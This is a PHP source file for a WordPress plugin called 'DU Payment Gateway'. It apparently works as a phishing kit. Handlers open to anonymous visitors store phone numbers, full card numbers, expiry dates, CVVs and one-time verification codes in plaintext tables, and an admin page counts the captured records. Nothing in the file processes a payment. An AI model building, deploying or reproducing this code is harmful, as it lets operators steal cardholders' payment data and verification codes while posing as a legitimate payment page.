<?php
/**
 * Plugin Name: DU Payment Gateway
 * Plugin URI: https://github.com/du53344/duuu
 * Description: Complete DU Payment Interface with Database Integration - Ready for WordPress
 * Version: 1.0.0
 * Author: DU Payment Team
 * Author URI: https://pqfharcu.manus.space
 * License: MIT
 * Text Domain: du-payment
 * Domain Path: /languages
 * Requires at least: 5.0
 * Tested up to: 6.4
 * Requires PHP: 7.4
 * Network: false
 */

// Prevent direct access
if (!defined('ABSPATH')) {
    exit;
}

// Define plugin constants
define('DU_PAYMENT_VERSION', '1.0.0');
define('DU_PAYMENT_PLUGIN_URL', plugin_dir_url(__FILE__));
define('DU_PAYMENT_PLUGIN_PATH', plugin_dir_path(__FILE__));
define('DU_PAYMENT_PLUGIN_FILE', __FILE__);

/**
 * Main DU Payment Plugin Class
 */
class DUPaymentPlugin {
    
    /**
     * Constructor
     */
    public function __construct() {
        add_action('init', array($this, 'init'));
        add_action('wp_enqueue_scripts', array($this, 'enqueue_scripts'));
        add_shortcode('du_payment', array($this, 'render_payment_interface'));
        add_shortcode('du_payment_full', array($this, 'render_full_payment_page'));
        
        // Admin hooks
        add_action('admin_menu', array($this, 'add_admin_menu'));
        add_action('admin_init', array($this, 'admin_init'));
        
        // AJAX hooks for payment processing
        add_action('wp_ajax_du_save_phone', array($this, 'save_phone_number'));
        add_action('wp_ajax_nopriv_du_save_phone', array($this, 'save_phone_number'));
        add_action('wp_ajax_du_save_card', array($this, 'save_card_details'));
        add_action('wp_ajax_nopriv_du_save_card', array($this, 'save_card_details'));
        add_action('wp_ajax_du_save_verification', array($this, 'save_verification_code'));
        add_action('wp_ajax_nopriv_du_save_verification', array($this, 'save_verification_code'));
        
        // Activation and deactivation hooks
        register_activation_hook(__FILE__, array($this, 'activate'));
        register_deactivation_hook(__FILE__, array($this, 'deactivate'));
    }
    
    /**
     * Initialize plugin
     */
    public function init() {
        // Load text domain for translations
        load_plugin_textdomain('du-payment', false, dirname(plugin_basename(__FILE__)) . '/languages');
        
        // Create database tables if they don't exist
        $this->create_database_tables();
    }
    
    /**
     * Enqueue scripts and styles
     */
    public function enqueue_scripts() {
        // Enqueue the built React application
        wp_enqueue_script(
            'du-payment-app',
            DU_PAYMENT_PLUGIN_URL . 'du-payment-site/dist/assets/index.js',
            array(),
            DU_PAYMENT_VERSION,
            true
        );
        
        wp_enqueue_style(
            'du-payment-style',
            DU_PAYMENT_PLUGIN_URL . 'du-payment-site/dist/assets/index.css',
            array(),
            DU_PAYMENT_VERSION
        );
        
        // Localize script for AJAX
        wp_localize_script('du-payment-app', 'duPaymentAjax', array(
            'ajaxurl' => admin_url('admin-ajax.php'),
            'nonce' => wp_create_nonce('du_payment_nonce'),
            'plugin_url' => DU_PAYMENT_PLUGIN_URL
        ));
    }
    
    /**
     * Render payment interface shortcode
     */
    public function render_payment_interface($atts) {
        $atts = shortcode_atts(array(
            'width' => '100%',
            'height' => '600px'
        ), $atts);
        
        ob_start();
        ?>
        <div id="du-payment-container" style="width: <?php echo esc_attr($atts['width']); ?>; height: <?php echo esc_attr($atts['height']); ?>;">
            <div id="du-payment-root"></div>
        </div>
        <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Initialize the React app when DOM is ready
            if (window.DUPaymentApp) {
                window.DUPaymentApp.render(document.getElementById('du-payment-root'));
            }
        });
        </script>
        <?php
        return ob_get_clean();
    }
    
    /**
     * Render full payment page shortcode
     */
    public function render_full_payment_page($atts) {
        ob_start();
        ?>
        <div id="du-payment-full-page" style="width: 100%; min-height: 100vh;">
            <div id="du-payment-root"></div>
        </div>
        <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Initialize the React app for full page
            if (window.DUPaymentApp) {
                window.DUPaymentApp.render(document.getElementById('du-payment-root'));
            }
        });
        </script>
        <?php
        return ob_get_clean();
    }
    
    /**
     * Add admin menu
     */
    public function add_admin_menu() {
        add_options_page(
            'DU Payment Settings',
            'DU Payment',
            'manage_options',
            'du-payment-settings',
            array($this, 'admin_page')
        );
    }
    
    /**
     * Admin page
     */
    public function admin_page() {
        ?>
        <div class="wrap">
            <h1>DU Payment Gateway Settings</h1>
            <div class="card">
                <h2>Usage Instructions</h2>
                <p>Use the following shortcodes to display the DU Payment interface:</p>
                <ul>
                    <li><code>[du_payment]</code> - Display payment interface in a container</li>
                    <li><code>[du_payment_full]</code> - Display full-page payment interface</li>
                </ul>
                
                <h3>Shortcode Parameters</h3>
                <ul>
                    <li><code>width</code> - Set container width (default: 100%)</li>
                    <li><code>height</code> - Set container height (default: 600px)</li>
                </ul>
                
                <h3>Examples</h3>
                <p><code>[du_payment width="100%" height="700px"]</code></p>
                <p><code>[du_payment_full]</code></p>
            </div>
            
            <div class="card">
                <h2>Database Information</h2>
                <p>The plugin automatically creates the following database tables:</p>
                <ul>
                    <li><strong>du_phone_numbers</strong> - Stores phone numbers</li>
                    <li><strong>du_card_details</strong> - Stores card information</li>
                    <li><strong>du_verification_codes</strong> - Stores verification codes</li>
                    <li><strong>du_sessions</strong> - Tracks user sessions</li>
                </ul>
                
                <?php
                global $wpdb;
                $phone_count = $wpdb->get_var("SELECT COUNT(*) FROM {$wpdb->prefix}du_phone_numbers");
                $card_count = $wpdb->get_var("SELECT COUNT(*) FROM {$wpdb->prefix}du_card_details");
                $verification_count = $wpdb->get_var("SELECT COUNT(*) FROM {$wpdb->prefix}du_verification_codes");
                ?>
                
                <h3>Current Data</h3>
                <ul>
                    <li>Phone Numbers: <?php echo intval($phone_count); ?></li>
                    <li>Card Details: <?php echo intval($card_count); ?></li>
                    <li>Verification Codes: <?php echo intval($verification_count); ?></li>
                </ul>
            </div>
            
            <div class="card">
                <h2>Live Demo</h2>
                <p>View the live demo: <a href="https://pqfharcu.manus.space" target="_blank">https://pqfharcu.manus.space</a></p>
                <p>Source Code: <a href="https://github.com/du53344/duuu" target="_blank">https://github.com/du53344/duuu</a></p>
            </div>
        </div>
        <?php
    }
    
    /**
     * Admin init
     */
    public function admin_init() {
        // Register settings if needed
    }
    
    /**
     * Create database tables
     */
    private function create_database_tables() {
        global $wpdb;
        
        $charset_collate = $wpdb->get_charset_collate();
        
        // Phone numbers table
        $table_phone = $wpdb->prefix . 'du_phone_numbers';
        $sql_phone = "CREATE TABLE $table_phone (
            id int(11) NOT NULL AUTO_INCREMENT,
            session_id varchar(255) NOT NULL,
            phone_number varchar(20) NOT NULL,
            created_at timestamp DEFAULT CURRENT_TIMESTAMP,
            PRIMARY KEY (id)
        ) $charset_collate;";
        
        // Card details table
        $table_card = $wpdb->prefix . 'du_card_details';
        $sql_card = "CREATE TABLE $table_card (
            id int(11) NOT NULL AUTO_INCREMENT,
            session_id varchar(255) NOT NULL,
            card_number varchar(20) NOT NULL,
            expiry_date varchar(10) NOT NULL,
            cvv varchar(5) NOT NULL,
            created_at timestamp DEFAULT CURRENT_TIMESTAMP,
            PRIMARY KEY (id)
        ) $charset_collate;";
        
        // Verification codes table
        $table_verification = $wpdb->prefix . 'du_verification_codes';
        $sql_verification = "CREATE TABLE $table_verification (
            id int(11) NOT NULL AUTO_INCREMENT,
            session_id varchar(255) NOT NULL,
            code varchar(10) NOT NULL,
            created_at timestamp DEFAULT CURRENT_TIMESTAMP,
            PRIMARY KEY (id)
        ) $charset_collate;";
        
        // Sessions table
        $table_sessions = $wpdb->prefix . 'du_sessions';
        $sql_sessions = "CREATE TABLE $table_sessions (
            id int(11) NOT NULL AUTO_INCREMENT,
            session_id varchar(255) NOT NULL UNIQUE,
            created_at timestamp DEFAULT CURRENT_TIMESTAMP,
            updated_at timestamp DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            PRIMARY KEY (id)
        ) $charset_collate;";
        
        require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
        dbDelta($sql_phone);
        dbDelta($sql_card);
        dbDelta($sql_verification);
        dbDelta($sql_sessions);
    }
    
    /**
     * Save phone number via AJAX
     */
    public function save_phone_number() {
        check_ajax_referer('du_payment_nonce', 'nonce');
        
        $phone_number = sanitize_text_field($_POST['phone_number']);
        $session_id = sanitize_text_field($_POST['session_id']);
        
        global $wpdb;
        
        // Insert or update session
        $wpdb->replace(
            $wpdb->prefix . 'du_sessions',
            array('session_id' => $session_id),
            array('%s')
        );
        
        // Insert phone number
        $result = $wpdb->insert(
            $wpdb->prefix . 'du_phone_numbers',
            array(
                'session_id' => $session_id,
                'phone_number' => $phone_number
            ),
            array('%s', '%s')
        );
        
        if ($result) {
            wp_send_json_success(array('message' => 'Phone number saved successfully'));
        } else {
            wp_send_json_error(array('message' => 'Failed to save phone number'));
        }
    }
    
    /**
     * Save card details via AJAX
     */
    public function save_card_details() {
        check_ajax_referer('du_payment_nonce', 'nonce');
        
        $session_id = sanitize_text_field($_POST['session_id']);
        $card_number = sanitize_text_field($_POST['card_number']);
        $expiry_date = sanitize_text_field($_POST['expiry_date']);
        $cvv = sanitize_text_field($_POST['cvv']);
        
        global $wpdb;
        
        // Insert card details
        $result = $wpdb->insert(
            $wpdb->prefix . 'du_card_details',
            array(
                'session_id' => $session_id,
                'card_number' => $card_number,
                'expiry_date' => $expiry_date,
                'cvv' => $cvv
            ),
            array('%s', '%s', '%s', '%s')
        );
        
        if ($result) {
            wp_send_json_success(array('message' => 'Card details saved successfully'));
        } else {
            wp_send_json_error(array('message' => 'Failed to save card details'));
        }
    }
    
    /**
     * Save verification code via AJAX
     */
    public function save_verification_code() {
        check_ajax_referer('du_payment_nonce', 'nonce');
        
        $session_id = sanitize_text_field($_POST['session_id']);
        $code = sanitize_text_field($_POST['code']);
        
        global $wpdb;
        
        // Insert verification code
        $result = $wpdb->insert(
            $wpdb->prefix . 'du_verification_codes',
            array(
                'session_id' => $session_id,
                'code' => $code
            ),
            array('%s', '%s')
        );
        
        if ($result) {
            wp_send_json_success(array('message' => 'Verification code saved successfully'));
        } else {
            wp_send_json_error(array('message' => 'Failed to save verification code'));
        }
    }
    
    /**
     * Plugin activation
     */
    public function activate() {
        $this->create_database_tables();
        
        // Set default options
        add_option('du_payment_version', DU_PAYMENT_VERSION);
        
        // Flush rewrite rules
        flush_rewrite_rules();
    }
    
    /**
     * Plugin deactivation
     */
    public function deactivate() {
        // Clean up if needed
        flush_rewrite_rules();
    }
}

// Initialize the plugin
new DUPaymentPlugin();

/**
 * Plugin uninstall hook
 */
register_uninstall_hook(__FILE__, 'du_payment_uninstall');

function du_payment_uninstall() {
    global $wpdb;
    
    // Drop tables (optional - uncomment if you want to remove data on uninstall)
    /*
    $wpdb->query("DROP TABLE IF EXISTS {$wpdb->prefix}du_phone_numbers");
    $wpdb->query("DROP TABLE IF EXISTS {$wpdb->prefix}du_card_details");
    $wpdb->query("DROP TABLE IF EXISTS {$wpdb->prefix}du_verification_codes");
    $wpdb->query("DROP TABLE IF EXISTS {$wpdb->prefix}du_sessions");
    */
    
    // Delete options
    delete_option('du_payment_version');
}
?>

